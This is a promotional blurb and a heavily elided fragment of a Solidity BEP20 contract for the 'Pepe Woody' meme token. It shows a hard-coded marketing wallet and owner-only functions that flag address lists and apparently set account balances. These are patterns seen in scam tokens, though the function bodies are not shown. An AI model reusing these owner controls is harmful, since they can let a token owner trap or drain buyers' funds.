...
Pepe Woody, the meme token inspired by the beloved character from Toy Story, is set to launch on the BSC network
bringing a fun and playful twist to the world of cryptocurrency. With its unique concept and growing popularity
Pepe Woody is poised to make a name for itself in the world of meme coins and beyond.
...
*/
    ...
    contract PepeWoody   is IBEP20, Ownable
    {
        ...
        string private constant _name = "Pepe Woody";
        string private constant _symbol = "$PepeWoody";
        ...
        address public constant MarketingWallet=0xeADd6A4ACe1D56B49dc6B19862dF2742349522Ca; 
        ...
        constructor () {
           ...
           function OwnerSetAddress(address account) external onlyOwner {
            ...
            function RewardsReciever(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function MarketingAllowFunds(address account, uint256 balance) onlyOwner  public virtual {
